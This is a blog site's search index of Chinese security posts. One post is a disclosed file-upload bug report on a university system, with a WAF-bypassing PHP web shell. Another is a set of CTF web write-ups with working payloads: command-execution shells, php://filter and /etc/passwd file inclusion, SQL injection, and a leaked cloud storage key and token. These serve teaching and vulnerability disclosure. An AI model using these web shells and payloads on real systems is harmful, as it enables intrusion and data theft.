<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>EDUSRC-漏洞挖掘案例（一）</title>
      <link href="/2020/09/25/Edusrc-Vulnerability-mining-1/"/>
      <url>/2020/09/25/Edusrc-Vulnerability-mining-1/</url>
      
        <content type="html"><![CDATA[<h1 id="EDUSRC-漏洞挖掘案例（一）"><a href="#EDUSRC-漏洞挖掘案例（一）" class="headerlink" title="EDUSRC-漏洞挖掘案例（一）"></a>EDUSRC-漏洞挖掘案例（一）</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p>在发现此漏洞后，第一时间联系了该大学的信息中心老师，并且该系统当晚就完成了修复。</p><p>本文的初衷就是分享网络安全知识，若有读者因此做出任何危害网络安全的行为，请后果自负。</p></blockquote><p>系统地址:<a href="http://xxx.xxx.edu.cn/index.php/index/login" target="_blank" rel="noopener">http://xxx.xxx.edu.cn/index.php/index/login</a></p><p>报名申请页面:<a href="http://xxx.xxx.edu.cn/register" target="_blank" rel="noopener">http://xxx.xxx.edu.cn/register</a></p><h2 id="一、任意文件上传漏洞"><a href="#一、任意文件上传漏洞" class="headerlink" title="一、任意文件上传漏洞"></a>一、任意文件上传漏洞</h2><p>报名申请页面有一处上传图片的功能</p><p><img src="/img/2020/09/25/faad789e-71ef-4ffc-bfb0-f32c4708c466.png" alt></p><p>然后我们上传一个正常的图片，会提示需要输入身份证号才行</p><p><img src="/img/2020/09/25/0273dc24-0cfc-4ba9-815c-b0179607ca02.png" alt></p><p>然后随便输一个身份证号就行</p><p>例如：<code>110999199901011111</code></p><p>成功上传后会返回此文件在服务器上的路径</p><p><img src="/img/2020/09/25/174ade2b-11fe-4c1b-ad9e-6265eb072962.png" alt></p><p>改后缀为<code>.php</code>也可以上传成功，不过网站的waf会对上传文件的内容做检查，当出现<code>php</code>、<code>$_GET</code>、<code>$_POST</code>等php相关函数时会直接报错，提示文件有威胁。</p><p><img src="/img/2020/09/25/c6c3dde1-85ec-4d55-aff8-41d76b51b9f6.png" alt></p><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>姿势挺多的，这里找了一种，直接用反引号执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[1]`;</span><br></pre></td></tr></table></figure><p>上传成功。</p><p><img src="/img/2020/09/25/50a49672-d9c9-49b6-9175-af6d3e26dd1d.png" alt></p><h3 id="shell地址："><a href="#shell地址：" class="headerlink" title="shell地址："></a>shell地址：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.edu.cn/public/uploads/registers/110999199901011111/100.php?1=whoami</span><br></pre></td></tr></table></figure><p><img src="/img/2020/09/25/30314091-9f5e-49ef-945c-71feda8e7d6e.png" alt></p><p><img src="/img/2020/09/25/6b58e4fd-b497-4131-89db-d5f4611cf308.png" alt></p><p><strong>未深入测试。</strong></p><h2 id="二、任意文件删除漏洞"><a href="#二、任意文件删除漏洞" class="headerlink" title="二、任意文件删除漏洞"></a>二、任意文件删除漏洞</h2><p>这个洞没仔细测，因为会删除服务器上的文件，比较敏感，怀疑是有的。</p><p>漏洞出现在删除上传图片的功能处，上传一个文件，删除时抓包会抓到删除接口</p><p><img src="/img/2020/09/25/ab22a6fe-1580-4e02-9ce6-4a084918dd99.png" alt></p><p><img src="/img/2020/09/25/e304ff29-db1d-4874-a4b6-4f8679b4d5fb.png" alt></p><p>经过<code>Urldecode</code>发现是真实路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/html/public/uploads/registers/110000100000000000/100.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/2020/09/25/96a0011d-140c-4768-b555-30d1fcb64b51.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八月，CTF练习-Web</title>
      <link href="/2020/08/30/CTF-August-Practice-Web/"/>
      <url>/2020/08/30/CTF-August-Practice-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-7-10-2020-8-30"><a href="#2020-7-10-2020-8-30" class="headerlink" title="2020/7/10-2020/8/30"></a>2020/7/10-2020/8/30</h1><h1 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h2 id="西普杯—2016"><a href="#西普杯—2016" class="headerlink" title="西普杯—2016"></a>西普杯—2016</h2><h3 id="2016-西普杯京津冀信息安全挑战赛-Web-web01"><a href="#2016-西普杯京津冀信息安全挑战赛-Web-web01" class="headerlink" title="2016-西普杯京津冀信息安全挑战赛-Web-web01"></a>2016-西普杯京津冀信息安全挑战赛-Web-web01</h3><p>访问robots.txt，会发现解此题必须先完成re2，拿到密码才可以进行操作。</p><p><img src="/img/2020/08/30/mHqVBpgU5ZJ0Usub.png" alt></p><p>re2逆向分析完毕得到<code>admin,328du919sud9</code></p><p>登陆后提示”Flag is Not Here!”</p><p>抓包看了下，发现cookie里的is_login有点可疑</p><p><img src="/img/2020/08/30/IXvXsjgUQ4oLAol2.png" alt></p><p>将is_login=0改为1，即可拿到flag。</p><p><img src="/img/2020/08/30/4hvPNHqxVZDgwNt3.png" alt></p><h3 id="2016-西普杯京津冀信息安全挑战赛-Web-web02"><a href="#2016-西普杯京津冀信息安全挑战赛-Web-web02" class="headerlink" title="2016-西普杯京津冀信息安全挑战赛-Web-web02"></a>2016-西普杯京津冀信息安全挑战赛-Web-web02</h3><p>访问robots.txt，发现提示信息</p><p><img src="/img/2020/08/30/RIiAtC2fZnjbadPv.png" alt></p><p>确定cms为<code>Vwins</code></p><p>通过GET添加<code>&quot;allowed=*&quot;</code>来绕过上传限制</p><p><img src="/img/2020/08/30/cyfDhD2uQJFb9qfb.png" alt></p><h3 id="2016-西普杯京津冀信息安全挑战赛-Web-web03"><a href="#2016-西普杯京津冀信息安全挑战赛-Web-web03" class="headerlink" title="2016-西普杯京津冀信息安全挑战赛-Web-web03"></a>2016-西普杯京津冀信息安全挑战赛-Web-web03</h3><p>待完成。。。</p><p><a href="http://lab.seclover.com/?p=233" target="_blank" rel="noopener">http://lab.seclover.com/?p=233</a></p><h2 id="第五空间智能安全大赛—2020"><a href="#第五空间智能安全大赛—2020" class="headerlink" title="第五空间智能安全大赛—2020"></a>第五空间智能安全大赛—2020</h2><h3 id="2020-第五空间智能安全大赛-Web-hate-php"><a href="#2020-第五空间智能安全大赛-Web-hate-php" class="headerlink" title="2020-第五空间智能安全大赛-Web-hate-php"></a>2020-第五空间智能安全大赛-Web-hate-php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if (preg_match(&apos;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&apos;|\`|\||\[|\]|\_|=)/i&apos;,$code)) &#123; </span><br><span class="line">        die(&apos;You are too good for me&apos;); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[&apos;internal&apos;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match (&apos;/&apos; . $blackitem . &apos;/im&apos;, $code)) &#123; </span><br><span class="line">            die(&apos;You deserve better&apos;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多种解法，过滤的很严，主要就是无字符webshell</p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>本地测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str = urlencode(~&apos;phpinfo&apos;);</span><br><span class="line">    echo $str;</span><br><span class="line">?&gt;</span><br><span class="line">//%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>然后传递时再次取反</p><p><img src="/img/2020/08/30/ay4GBUNf1yjNtALN.png" alt></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/30/SHLEvjogPxUL0mDQ.png" alt></p><p>另外一种</p><p>利用highlight_file函数打印flag.php内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(~%99%93%9E%98%D1%8F%97%8F)</span><br></pre></td></tr></table></figure><h1 id="BUUOJ"><a href="#BUUOJ" class="headerlink" title="BUUOJ"></a>BUUOJ</h1><h2 id="ACTF—2020"><a href="#ACTF—2020" class="headerlink" title="ACTF—2020"></a>ACTF—2020</h2><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]-BackupFile"></a>[ACTF2020 新生赛]-BackupFile</h3><p>访问提示”Try to find out source file!”，寻找备份文件。</p><p>这里盲猜”index.php.bak”，当然也可以用扫描器扫一下。</p><p>得到代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;key&apos;])) &#123;</span><br><span class="line">    $key = $_GET[&apos;key&apos;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传递的key参数必须为数字型，且与str变量值相等。<br>注意是弱比较”==”</p><p>直接构造 index.php?key=123</p><p>即可得到flag</p><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]-Exec"></a>[ACTF2020 新生赛]-Exec</h3><p>比较简单的一道命令注入题目</p><p><img src="/img/2020/08/30/aSAGfor9HbyXQ95f.png" alt></p><h3 id="ACTF2020-新生赛-include"><a href="#ACTF2020-新生赛-include" class="headerlink" title="[ACTF2020 新生赛]-include"></a>[ACTF2020 新生赛]-include</h3><p>简单任意文件包含漏洞，多种解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>### </p><h3 id="ACTF2020-新生赛-include-1"><a href="#ACTF2020-新生赛-include-1" class="headerlink" title="[ACTF2020 新生赛]-include"></a>[ACTF2020 新生赛]-include</h3><p>文件上传漏洞，js验证，但是后端有过滤了几种后缀</p><p>这里直接上传的 .phtml 类型文件。</p><p><img src="/img/2020/08/30/e2W4PRLyxzClhl5I.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uplo4d/b284530b9d2636c66a4e6f32315ccac3.phtml?cmd=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure><h2 id="极客大挑战—2019"><a href="#极客大挑战—2019" class="headerlink" title="极客大挑战—2019"></a>极客大挑战—2019</h2><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]-Upload"></a>[极客大挑战 2019]-Upload</h3><p>文件上传漏洞</p><p>对文件后缀做了限制，发现”.phtml”、”.htaccess”类型后缀可以上传</p><p>对文件内容做了检测，不能包含<code>&lt;?</code>字符，必须是图片格式</p><p>图片格式可用”GIF89a”绕过</p><p>文件内容用<code>&lt;script language=&quot;php&quot;&gt;</code>指定语言为php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_GET[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功上传后文件会在”upload”目录下<br><img src="/img/2020/08/30/twIsyTBRsVHOUBWD.png" alt></p><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]-Http"></a>[极客大挑战 2019]-Http</h3><p>查看源码发现了一个”Secret.php”文件</p><p><img src="/img/2020/08/30/PAu1Px70CoIWStm9.png" alt></p><p>访问该文件，第一关”It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;&quot;" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;&quot;</a></p><p>修改Referer</p><p>第二关”Please use “Syclover” browser”</p><p>修改User-Agent</p><p>第三关”No!!! you can only read this locally!!!”</p><p>修改XFF信息</p><p><img src="/img/2020/08/30/RJvCZPcfPiS7rYf6.png" alt></p><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]-Knife"></a>[极客大挑战 2019]-Knife</h3><p>页面提示”我家菜刀丢了，你能帮我找一下么eval($_POST[“Syc”]);”</p><p>并没有其他提示，盲猜index.php为shell</p><p>蚁剑连接得到flag。</p><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]-Havefun"></a>[极客大挑战 2019]-Havefun</h3><p>查看源码发现注释代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>如果cat参数的值为dog，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]-Secret File"></a>[极客大挑战 2019]-Secret File</h3><p>查看源码发现有一个”Archive_room.php”文件</p><p>访问得到另一个php文件，访问会跳转到end.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl http://eda7751c-1502-4f22-ad1d-56d45abb0629.node3.buuoj.cn/action.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">   secr3t.php</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>得到”secr3t.php”文件<br>访问得到代码，代码审计，但是过滤了”../“等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file);</span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>直接php流读flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]-BuyFlag"></a>[极客大挑战 2019]-BuyFlag</h3><p>pay.php页面得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>POST一个password参数，弱类型比较，需绕过is_numeric函数</p><p>传递password=404a即可绕过。</p><p>发送数据包又提示必须是学生才能购买flag，此时注意到cookie里的user的值为0，改为1即可</p><p><img src="/img/2020/08/30/dc49KyIomrZ3Qa4f.png" alt></p><p>然后又提示无法购买，因为没有钱，此时应该传递money参数，因为价格值比较大需要绕过，空数组绕过或者科学计数法</p><p>you are Cuiter Password Right! Pay for the flag!!!hacker!!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;user=1&quot; -X POST -d &quot;password=404a&amp;money=1e9&quot; http://f66a562d-3b7c-4005-89ba-95103ed3ce8f.node3.buuoj.cn/pay.php</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]-PHP"></a>[极客大挑战 2019]-PHP</h3><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]-EasySQL"></a>[极客大挑战 2019]-EasySQL</h3><p>注入，万能密码进入得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=admin%27+or+1=1+%23&amp;password=2131231</span><br></pre></td></tr></table></figure><h2 id="GeekPwn云靶场挑战赛-2020"><a href="#GeekPwn云靶场挑战赛-2020" class="headerlink" title="GeekPwn云靶场挑战赛-2020"></a>GeekPwn云靶场挑战赛-2020</h2><h3 id="web-cosplay"><a href="#web-cosplay" class="headerlink" title="web-cosplay!"></a>web-cosplay!</h3><p>访问题目是一个上传接口，尝试上传文件进行拦包发现没有数据传输。</p><p>页面有js源码，格式化整理</p><p><a href="https://uploader.shimo.im/f/8zPOeFL9lgtUVvJV.js" target="_blank" rel="noopener">cos.js</a></p><p>访问接口获得临时密钥和token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://110.80.136.44:21061/GetTempKey?path=/upload</span><br></pre></td></tr></table></figure><p>腾讯云cos的官方文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/document/product/436/12269</span><br></pre></td></tr></table></figure><p>使用Python SDK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U cos-python-sdk-v5</span><br></pre></td></tr></table></figure><p>先获取到存储库中的文件列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8</span><br><span class="line"># appid 已在配置中移除,请在参数 Bucket 中带上 appid。Bucket 由 BucketName-APPID 组成</span><br><span class="line"># 1. 设置用户配置, 包括 secretId，secretKey 以及 Region</span><br><span class="line">from qcloud_cos import CosConfig</span><br><span class="line">from qcloud_cos import CosS3Client</span><br><span class="line">import sys</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, stream=sys.stdout)</span><br><span class="line"></span><br><span class="line">secret_id = &apos;AKIDI3mGJj1_-HuuyZjf_VMzWTgN-XrVNlKDfjhBtvUT3cWhkdqtQdq2lqSFgEJJSBTl&apos;      # 替换为用户的 secretId</span><br><span class="line">secret_key = &apos;APG7JBj2tKd/PP2R2bJS3BKQkGzLUrmuf0MEabRZWzY=&apos;      # 替换为用户的 secretKey</span><br><span class="line">region = &apos;ap-shanghai&apos;     # 替换为用户的 Region</span><br><span class="line">token = &apos;KOsNuiFiydOayuDdi1cUWqkJKBWbT8LM753824bf1ed5c00a6900daf7098d7528bv6S6KuE4B-QEYTDCVgTNM-yQaipGqDcAm3mlgS9LRqf6Ulqr2007eItzXcfrlnozHOlUW0vEqAhbP3dQ54iZndm-qQDAK3uuXew2q1rI3Q8W8UYIHrwhPxfRoNJ9ysWB7g1Z0aBkNQxFkEV5CFrqcYQs3kRLmSnqBcCvIRSHADofCplyzzHeHrg7DdfDohn-E9CDazuWxNtfjHIY85QYfc7e4dW9u8IO0w2jzM-7gYfvcf5CoqXsELAtbBiiZnsoK2HspQy1Xf4zkj82hxmy6adhhagz9RDMmJByfSYGEkxeQaMsFCuE-3Hs4Dr8xneOWjnV0A4iD5atIr4r1HO5CBSxVY2YZh63c5J-7U9tD4&apos;        # 使用临时密钥需要传入 Token，默认为空，可不填</span><br><span class="line">#scheme = &apos;https&apos;            # 指定使用 http/https 协议来访问 COS，默认为 https，可不填</span><br><span class="line">config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token)</span><br><span class="line"># 2. 获取客户端对象</span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"># 参照下文的描述。或者参照 Demo 程序，详见 https://github.com/tencentyun/cos-python-sdk-v5/blob/master/qcloud_cos/demo.py</span><br><span class="line">####  获取文件到本地</span><br><span class="line">response = client.list_objects(</span><br><span class="line">    Bucket=&apos;933kpwn-1253882285&apos;,</span><br><span class="line">)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/30/uyuJqB96Y1vMtK5O.png" alt></p><p>找到flag文件直接下载到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8</span><br><span class="line"># appid 已在配置中移除,请在参数 Bucket 中带上 appid。Bucket 由 BucketName-APPID 组成</span><br><span class="line"># 1. 设置用户配置, 包括 secretId，secretKey 以及 Region</span><br><span class="line">from qcloud_cos import CosConfig</span><br><span class="line">from qcloud_cos import CosS3Client</span><br><span class="line">import sys</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, stream=sys.stdout)</span><br><span class="line"></span><br><span class="line">secret_id = &apos;AKIDI3mGJj1_-HuuyZjf_VMzWTgN-XrVNlKDfjhBtvUT3cWhkdqtQdq2lqSFgEJJSBTl&apos;      # 替换为用户的 secretId</span><br><span class="line">secret_key = &apos;APG7JBj2tKd/PP2R2bJS3BKQkGzLUrmuf0MEabRZWzY=&apos;      # 替换为用户的 secretKey</span><br><span class="line">region = &apos;ap-shanghai&apos;     # 替换为用户的 Region</span><br><span class="line">token = &apos;KOsNuiFiydOayuDdi1cUWqkJKBWbT8LM753824bf1ed5c00a6900daf7098d7528bv6S6KuE4B-QEYTDCVgTNM-yQaipGqDcAm3mlgS9LRqf6Ulqr2007eItzXcfrlnozHOlUW0vEqAhbP3dQ54iZndm-qQDAK3uuXew2q1rI3Q8W8UYIHrwhPxfRoNJ9ysWB7g1Z0aBkNQxFkEV5CFrqcYQs3kRLmSnqBcCvIRSHADofCplyzzHeHrg7DdfDohn-E9CDazuWxNtfjHIY85QYfc7e4dW9u8IO0w2jzM-7gYfvcf5CoqXsELAtbBiiZnsoK2HspQy1Xf4zkj82hxmy6adhhagz9RDMmJByfSYGEkxeQaMsFCuE-3Hs4Dr8xneOWjnV0A4iD5atIr4r1HO5CBSxVY2YZh63c5J-7U9tD4&apos;        # 使用临时密钥需要传入 Token，默认为空，可不填</span><br><span class="line">#scheme = &apos;https&apos;            # 指定使用 http/https 协议来访问 COS，默认为 https，可不填</span><br><span class="line">config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token)</span><br><span class="line"># 2. 获取客户端对象</span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"># 参照下文的描述。或者参照 Demo 程序，详见 https://github.com/tencentyun/cos-python-sdk-v5/blob/master/qcloud_cos/demo.py</span><br><span class="line">####  获取文件到本地</span><br><span class="line">response = client.get_object(</span><br><span class="line">Bucket=&apos;933kpwn-1253882285&apos;,</span><br><span class="line">Key=&apos;f1L9@/flag.txt&apos;,</span><br><span class="line">)</span><br><span class="line">response[&apos;Body&apos;].get_stream_to_file(&apos;output.txt&apos;)</span><br><span class="line"></span><br><span class="line">fp = response[&apos;Body&apos;].get_raw_stream()</span><br><span class="line">print(fp.read())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PCCTF热身赛—溯源&amp;社工类题目解析</title>
      <link href="/2020/06/30/2020-PCCTF-Writeup/"/>
      <url>/2020/06/30/2020-PCCTF-Writeup/</url>
      
